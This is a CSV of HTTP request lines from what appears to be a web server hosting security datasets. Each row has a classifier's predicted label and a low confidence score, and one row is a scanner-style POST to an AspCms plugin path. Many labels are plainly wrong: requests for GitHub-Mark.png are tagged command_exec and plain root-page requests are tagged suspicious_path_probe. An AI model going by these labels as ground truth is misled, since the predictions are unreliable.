row_idx,text,pred_label,max_prob
385,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
386,METHOD=GET PATH=/self.logs/error.log.2021-03-22 QUERY= PROTOCOL=HTTP/1.1,benign,0.5126395225524902
387,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
388,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
389,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
390,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
391,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
392,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.0,suspicious_path_probe,0.4692745804786682
393,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.0,suspicious_path_probe,0.4692745804786682
394,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
395,METHOD=GET PATH=/misc/zeus_dga_domains.txt.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.6757688522338867
396,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
397,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.0,benign,0.5511705279350281
398,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/dns.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5995742082595825
399,METHOD=GET PATH=/Datasets%20Description/ QUERY=C=D;O=D PROTOCOL=HTTP/1.1,benign,0.44596144556999207
400,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
401,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
402,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
403,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
404,METHOD=GET PATH=/Datasets%20Description/ QUERY= PROTOCOL=HTTP/1.1,benign,0.4402334690093994
405,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/ QUERY=C=D;O=A PROTOCOL=HTTP/1.1,benign,0.5944873094558716
406,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/ QUERY=C=M;O=A PROTOCOL=HTTP/1.1,benign,0.5944585800170898
407,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/ QUERY=C=N;O=D PROTOCOL=HTTP/1.1,benign,0.6243715882301331
408,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/ QUERY=C=S;O=A PROTOCOL=HTTP/1.1,benign,0.5928223133087158
409,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/app_stats.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6336460113525391
410,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/conn.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6225396394729614
411,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/dhcp.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6127139329910278
412,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/dns.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6276155710220337
413,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/dpd.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6414214372634888
414,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/files.html QUERY= PROTOCOL=HTTP/1.1,benign,0.600266695022583
415,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/ftp.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6026156544685364
416,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/http.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6194688081741333
417,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/irc.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6335412263870239
418,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/loaded_scripts.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6321981549263
419,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/notice.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6399790644645691
420,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/packet_filter.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5978788733482361
421,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/ssl.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6159440279006958
422,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/weird.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6334364414215088
423,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/ QUERY=C=D;O=A PROTOCOL=HTTP/1.1,benign,0.586219310760498
424,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/ QUERY=C=M;O=A PROTOCOL=HTTP/1.1,benign,0.5864728689193726
425,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/ QUERY=C=N;O=D PROTOCOL=HTTP/1.1,benign,0.6111001968383789
426,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/ QUERY=C=S;O=A PROTOCOL=HTTP/1.1,benign,0.5839903950691223
427,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/app_stats.html QUERY= PROTOCOL=HTTP/1.1,benign,0.611397922039032
428,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/conn.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6011624336242676
429,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/dhcp.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5831754803657532
430,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/dns.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6014771461486816
431,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/dpd.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6182584762573242
432,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/files.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5758914947509766
433,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/ftp.html QUERY= PROTOCOL=HTTP/1.1,benign,0.583132266998291
434,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/http.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5959008932113647
435,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/irc.html QUERY= PROTOCOL=HTTP/1.1,benign,0.616906464099884
436,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/loaded_scripts.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6228588223457336
437,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/notice.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6193697452545166
438,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/packet_filter.html QUERY= PROTOCOL=HTTP/1.1,benign,0.565477728843689
439,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/ssl.html QUERY= PROTOCOL=HTTP/1.1,benign,0.596772313117981
440,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/weird.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6161631941795349
441,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/ QUERY=C=D;O=A PROTOCOL=HTTP/1.1,benign,0.5729430913925171
442,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/ QUERY=C=M;O=A PROTOCOL=HTTP/1.1,benign,0.5728198885917664
443,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/ QUERY=C=N;O=D PROTOCOL=HTTP/1.1,benign,0.5974732041358948
444,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/ QUERY=C=S;O=A PROTOCOL=HTTP/1.1,benign,0.5708516836166382
445,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/app_stats.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5984392762184143
446,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/conn.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6056768894195557
447,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/dhcp.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5792302489280701
448,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/dns.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5995742082595825
449,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/dpd.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6116724014282227
450,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/files.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5747700333595276
451,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/http.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5901079773902893
452,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/irc.html QUERY= PROTOCOL=HTTP/1.1,benign,0.60698401927948
453,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/loaded_scripts.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6020902991294861
454,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/notice.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6378210186958313
455,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/packet_filter.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5642861723899841
456,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/ssl.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5964149236679077
457,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/weird.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6438154578208923
458,METHOD=GET PATH=/Datasets%20Description/Network/N/A QUERY= PROTOCOL=HTTP/1.1,benign,0.5269061923027039
459,METHOD=GET PATH=/Datasets%20Description/Network/signatures.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5780556201934814
460,METHOD=GET PATH=/data QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.5001644492149353
461,METHOD=GET PATH=/self.logs/2015/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.43429169058799744
462,METHOD=GET PATH=/self.logs/2016/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.42049384117126465
463,METHOD=GET PATH=/self.logs/ QUERY=C=D;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4057440757751465
464,METHOD=GET PATH=/self.logs/ QUERY=C=M;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4098285138607025
465,METHOD=GET PATH=/self.logs/ QUERY=C=N;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4299328923225403
466,METHOD=GET PATH=/self.logs/ QUERY=C=S;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4082556962966919
467,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
468,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
469,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377134680747986
470,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
471,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
472,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
473,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
474,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
475,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
476,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
477,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
478,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
479,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
480,METHOD=POST PATH=/plug/collect/AspCms_CollectFun.asp QUERY= PROTOCOL=HTTP/1.1,benign,0.38716715574264526
481,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
482,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
483,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
484,METHOD=GET PATH=/honeypot/BSidesDFW%20-%202014.ipynb QUERY= PROTOCOL=HTTP/1.1,benign,0.43538182973861694
485,METHOD=GET PATH=/self.logs/access.log.2019-06-26.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.44755980372428894
486,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
487,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
488,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
489,METHOD=GET PATH=/self.logs/access.log.2020-11-12.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4837547838687897
490,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
491,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
492,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
493,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
494,METHOD=GET PATH=/self.logs/ QUERY=C=D;O=A PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4057440757751465
495,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
496,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
497,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
498,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
499,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
500,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
501,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
502,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
503,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
504,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
505,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
506,METHOD=GET PATH=/self.logs/access.log.2021-10-16.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.44538602232933044
507,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
508,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
509,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
510,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711091041565
511,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874844551086426
512,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
513,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
514,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
515,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
516,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
517,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
518,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
519,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
520,METHOD=GET PATH=/favicon.ico QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4143909513950348
521,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
522,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
523,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
524,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
525,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
526,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
527,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/dns.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6276155710220337
528,METHOD=GET PATH=/favicon.ico QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4143909513950348
529,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
530,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
531,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
532,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
533,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/ QUERY=C=S;O=D PROTOCOL=HTTP/1.1,benign,0.5966159105300903
534,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
535,METHOD=GET PATH=/self.logs/2016/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.42049384117126465
536,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
537,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
538,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
539,METHOD=GET PATH=/self.logs/access.log.2021-10-18.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4476793110370636
540,METHOD=GET PATH=/self.logs/error.log.2021-10-18.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.40654367208480835
541,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
542,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
543,METHOD=GET PATH=/Datasets%20Description/PE_malware/VirusShare.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5646774172782898
544,METHOD=GET PATH=/self.logs/error.log.2019-04-23.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.43187713623046875
545,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
546,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/dns.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6276155710220337
547,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
548,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
549,METHOD=GET PATH=/Datasets QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4420992136001587
550,METHOD=GET PATH=/honeypot/Honeypot QUERY= PROTOCOL=HTTP/1.1,benign,0.43761560320854187
551,METHOD=GET PATH=/self.logs/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4391734302043915
552,METHOD=GET PATH=/honeypot/BSidesDFW QUERY= PROTOCOL=HTTP/1.1,benign,0.44160017371177673
553,METHOD=GET PATH=/self.logs/ QUERY=C=N;O=D PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4299328923225403
554,METHOD=GET PATH=/self.logs/error.log.2020-06-14 QUERY= PROTOCOL=HTTP/1.1,benign,0.48388299345970154
555,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
556,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
557,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
558,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
559,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
560,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
561,METHOD=GET PATH=/wordpress/ QUERY= PROTOCOL=HTTP/1.1,benign,0.44304534792900085
562,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
563,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3 QUERY= PROTOCOL=HTTP/1.1,benign,0.587634265422821
564,METHOD=GET PATH=/Datasets%20Description/Network/dns.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5613512396812439
565,METHOD=GET PATH=/Datasets%20Description/Network/ftp.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5432575941085815
566,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
567,METHOD=GET PATH=/Datasets%20Description/Network/ssh.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5835829377174377
568,METHOD=GET PATH=/Datasets%20Description/Network/ssl.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5611499547958374
569,METHOD=GET PATH=/Datasets%20Description/Network/dhcp.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5409043431282043
570,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
571,METHOD=GET PATH=/Datasets%20Description/Network/http.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5685432553291321
572,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
573,METHOD=GET PATH=/Datasets%20Description/Network/smtp.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5483987331390381
574,METHOD=GET PATH=/Datasets%20Description/Network/files.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5314313173294067
575,METHOD=GET PATH=/Datasets%20Description/Network/weird.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5772854089736938
576,METHOD=GET PATH=/Datasets%20Description/Network/notice.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5891454815864563
577,METHOD=GET PATH=/Datasets%20Description/Network/tunnel.html QUERY= PROTOCOL=HTTP/1.1,benign,0.550652801990509
578,METHOD=GET PATH=/Datasets%20Description/PE_malware/Zeus.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5371832251548767
579,METHOD=GET PATH=/Datasets%20Description/Network/signatures.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5780556201934814
580,METHOD=GET PATH=/Datasets%20Description/PE_malware/OPCleaver.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5422806739807129
581,METHOD=GET PATH=/Datasets%20Description/PE_malware/VirusShare.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5646774172782898
582,METHOD=GET PATH=/Datasets%20Description/Network/N/A QUERY= PROTOCOL=HTTP/1.1,benign,0.5269061923027039
583,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/ QUERY= PROTOCOL=HTTP/1.1,benign,0.5956102609634399
584,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/ QUERY= PROTOCOL=HTTP/1.1,benign,0.5899902582168579
585,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/ QUERY= PROTOCOL=HTTP/1.1,benign,0.5773578882217407
586,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.0,suspicious_path_probe,0.4692745804786682
587,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
588,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
589,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
590,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
591,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/dns.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6014771461486816
592,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
593,METHOD=GET PATH=/self.logs/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4391734302043915
594,METHOD=GET PATH=/favicon.ico QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4143909513950348
595,METHOD=GET PATH=/self.logs/access.log.2017-01-08.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4573548138141632
596,METHOD=GET PATH=/self.logs/error.log.2021-10-02.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.42890673875808716
597,METHOD=GET PATH=/self.logs/error.log.2021-07-03 QUERY= PROTOCOL=HTTP/1.1,benign,0.4894387423992157
598,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
599,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
600,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
601,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
602,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
603,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
